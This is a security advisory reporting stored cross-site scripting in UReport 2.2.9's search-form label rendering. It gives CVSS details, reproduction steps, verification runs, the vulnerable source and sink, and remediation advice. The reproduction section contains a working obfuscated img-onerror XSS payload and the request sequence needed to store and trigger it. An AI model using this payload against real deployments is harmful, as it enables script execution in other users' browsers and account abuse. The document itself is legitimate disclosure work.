# UReport search-form label stored XSS

## Summary

UReport 2.2.9 contains stored cross-site scripting in report search-form rendering. InputComponent.toHtml concatenates the configured label directly into a span and the preview template renders the result as raw HTML. An authenticated report author can store executable markup that runs when another user previews the report.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan (钟广源), Fudan University**

## Attack prerequisites and impact

Authenticated report author; victim previews the stored report.

Verified flow: `search-form label → InputComponent.toHtml() → SearchFormData HTML → ${upSearchFormHtml}`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a report containing a search-form input component.
2. Set the component label to a benign marker wrapped in event-capable HTML and save the report.
3. Open the report preview as another user and inspect the rendered search form.

Sanitized request shape used during verification:

```http
# Authenticated UReport author; authentication value redacted
POST <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>
Content-Type: application/x-www-form-urlencoded

file    = URLENCODE×3("blade-gt48261022r44_3.ureport.xml")
content = URLENCODE×2('<ureport> ...
<search-form form-position="up">
  <input-text
    label="&lt;img src=x onerror = self[`al`+`ert`](`gt48261022r44c`)&gt;"
    bind-parameter="q" type="text" label-position="top"/>
</search-form>
... </ureport>')

GET <BASE_URL>/blade-report/ureport/preview
    ?_u=blade-gt48261022r44_3.ureport.xml
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt48261022r44a` | raw IMG inside search label | **PASS** |
| 2 | `gt48261022r44b` | raw IMG inside search label | **PASS** |
| 3 | `gt48261022r44c` | raw IMG inside search label | **PASS** |

```text
Saved preview response, run 3:
<span style='font-size:13px'><img src=x
  onerror = self[`al`+`ert`](`gt48261022r44c`)></span>
<input type='text' ... name='q' ...>

The payload is a real IMG element, not escaped text.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
InputComponent.java:31-43
public String toHtml(RenderContext context) {
    ...
    sb.append("<span style='font-size:13px'>" + this.label + "</span>");
    ...
}

html-preview.html:22
${upSearchFormHtml}
```

Root cause: The XML label is parsed into this.label and concatenated into an HTML fragment. The preview template then emits the fragment without context-sensitive encoding.

## Recommended remediation

HTML-encode the label before concatenation, or construct the element through a template/API that escapes text. Do not render upSearchFormHtml as trusted markup.

## References

- Official source: https://github.com/youseries/ureport/blob/master/ureport2-core/src/main/java/com/bstek/ureport/definition/searchform/InputComponent.java

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are public-safe renderings produced from saved raw HTTP/DOM/database evidence; they are not represented as live browser screenshots.

### Sanitized reproduction

![CAN-10 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-10/01-reproduction.png)

### Three-run success proof

![CAN-10 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-10/02-success-proof.png)

### Source-to-Sink evidence

![CAN-10 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-10/03-source-sink.png)
